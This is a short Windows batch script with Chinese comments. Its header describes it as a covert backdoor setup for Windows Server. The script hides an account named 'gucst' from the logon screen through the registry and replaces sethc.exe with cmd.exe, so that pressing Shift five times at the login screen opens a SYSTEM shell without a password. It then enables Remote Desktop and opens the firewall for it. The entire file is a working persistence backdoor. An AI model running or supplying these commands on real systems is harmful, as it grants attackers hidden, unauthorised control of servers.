@echo off
:: ==========================================
:: Windows Server 隐蔽后门配置脚本
:: 运行方式: 以管理员/SYSTEM权限运行
:: ==========================================

set BACKDOOR_USER=gucst

echo [1] hide %BACKDOOR_USER% (
:: 修改注册表 SpecialAccounts\UserList
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %BACKDOOR_USER% /t REG_DWORD /d 0 /f

echo [2]  Sticky Keys
:: 将 sethc.exe 替换为 cmd.exe
:: 即使不知道密码，在登录界面按5次Shift也能调出 SYSTEM CMD
takeown /f c:\windows\system32\sethc.exe
icacls c:\windows\system32\sethc.exe /grant administrators:F
copy /y c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe

echo [3]  RDP 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

echo.
echo [!] 
pause
